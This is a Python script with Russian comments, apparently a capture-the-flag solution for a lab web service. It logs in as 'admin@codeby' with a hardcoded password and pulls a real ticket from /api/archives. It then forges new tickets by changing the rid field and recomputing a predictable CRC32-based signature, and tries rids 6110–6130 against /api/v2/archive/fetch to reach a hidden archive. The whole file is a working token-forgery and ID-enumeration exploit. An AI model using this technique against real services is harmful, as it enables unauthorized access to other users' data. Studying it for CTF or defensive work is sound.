#!/usr/bin/env python3
"""Перебор rid 6110-6130 через POST /api/v2/archive/fetch
Цепочка: логин admin@codeby -> GET /api/archives (exp из реального
тикета) -> подделка тикета для каждого rid -> POST /api/v2/archive/fetch.
Остановка на первом 200 (найден скрытый архив). Лог пишется в файл.
"""
import base64
import json
import re
import sys
import time
import zlib

import requests

BASE = 'http://62.173.140.174:16126'
LOG_PATH = './northstar_log.txt'
RANGE = range(6110, 6131)
SKIP = {6112, 6115, 6119} # уже дано
DELAY = 1.0
HDRS = {'X-Client-Version': 'mobile-web/2.7', 'Content-Type': 'application/json'}

log_lines = []


def log(msg: str) -> None:
    print(msg, flush=True)
    log_lines.append(msg)


def tail(rid) -> str:
    return f'{zlib.crc32(f"northstar:{rid}:mobile-web".encode()):08x}'[:6]


def forge(original_ticket: str, rid: int) -> str:
    b64, _ = original_ticket.split('.')
    b64 += '=' * (-len(b64) % 4)
    payload = json.loads(base64.b64decode(b64))
    payload['rid'] = rid
    new_json = json.dumps(payload, separators=(',', ':')).encode()
    new_b64 = base64.b64encode(new_json).decode().rstrip('=')
    return f'{new_b64}.{tail(rid)}'


def main() -> None:
    s = requests.Session()
    s.headers['User-Agent'] = 'Mozilla/5.0 (X11; Linux x86_64) Chrome/156.0'

    # Логин
    r = s.post(f'{BASE}/api/session/login',
               json={'email': 'admin@codeby', 'password': 'heather'},
               timeout=10)
    log(f'[login] {r.status_code} {r.text[:120]}')
    if r.status_code != 200:
        log('error login')
        sys.exit(1)

    # Свежие тикеты
    r = s.get(f'{BASE}/api/archives', timeout=10)
    log(f'[archives] {r.status_code}')
    tickets = re.findall(r'eyJ[A-Za-z0-9+/=_-]+\.[0-9a-f]{6}', r.text)
    if not tickets:
        log('no tickets in /api/archives')
        sys.exit(1)
    sample = tickets[0].rstrip('=')
    b64part = sample.split('.')[0]
    b64part += '=' * (-len(b64part) % 4)
    exp = json.loads(base64.b64decode(b64part))['exp']
    log(f'[exp] exp = {exp}, tickets = {len(tickets)}')

    # Перебор
    found = []
    for rid in RANGE:
        if rid in SKIP:
            continue
        ticket = forge(sample, rid)
        try:
            r = s.post(f'{BASE}/api/v2/archive/fetch',
                       headers=HDRS, json={'ticket': ticket}, timeout=10)
        except requests.RequestException as e:
            log(f'[{rid}] EXC {e}')
            continue

        if r.status_code == 200:
            found.append(rid)
            log(f'[{rid}] tail={tail(rid)} -> {r.status_code} {r.text}')
            break
        else:
            log(f'[{rid}] tail={tail(rid)} -> {r.status_code} {r.text[:200]}')
        
        time.sleep(DELAY)

    with open(LOG_PATH, 'w') as f:
        f.write('\n'.join(log_lines) + '\n')
    print(f'Лог: {LOG_PATH}')


if __name__ == '__main__':
    main()